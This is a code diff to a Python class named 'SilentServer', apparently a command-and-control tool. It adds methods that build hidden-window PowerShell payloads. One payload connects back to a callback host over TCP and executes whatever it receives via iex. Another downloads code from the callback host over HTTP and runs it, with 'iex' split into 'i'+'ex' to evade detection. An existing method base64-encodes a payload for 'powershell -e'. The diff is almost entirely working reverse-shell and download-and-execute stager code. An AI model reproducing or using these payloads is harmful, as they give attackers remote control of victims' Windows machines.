@@ -33,6 +33,15 @@ class SilentServer:
                 self.clients            = []
                 self.in_comm            = False
 
+        def get_raw_payload(self) -> str:
+                payload                 = "start powershell -wi h -arg {$t=[net.sockets.tcpclient]::new('"
+                payload                += self.callback_address
+                payload                += "',"
+                payload                +=  str(self.callback_port)
+                payload                += ");[io.streamreader]::new($t.getstream()).readline()|iex}"
+
+                return payload
+
         def get_payload(self) -> str:
                 payload                 = "start powershell -wi h -arg {$t=[net.sockets.tcpclient]::new('"
                 payload                += self.callback_address
@@ -43,6 +52,18 @@ class SilentServer:
                 payload                 = base64.b64encode(payload)
                 payload                 = payload.decode("ascii")
                 payload                 = "powershell -e " + payload
+
+                return payload
+
+        def get_http_payload(self, http_port: str) -> str:
+                payload                 = "start powershell -wi h -arg {$i='i'+'ex';&$i(irm http://"
+                payload                += self.callback_address
+
+                if http_port != 80:
+                        payload        += ":"
+                        payload        += str(http_port)
+
+                payload                += ")}"
 
                 return payload
 
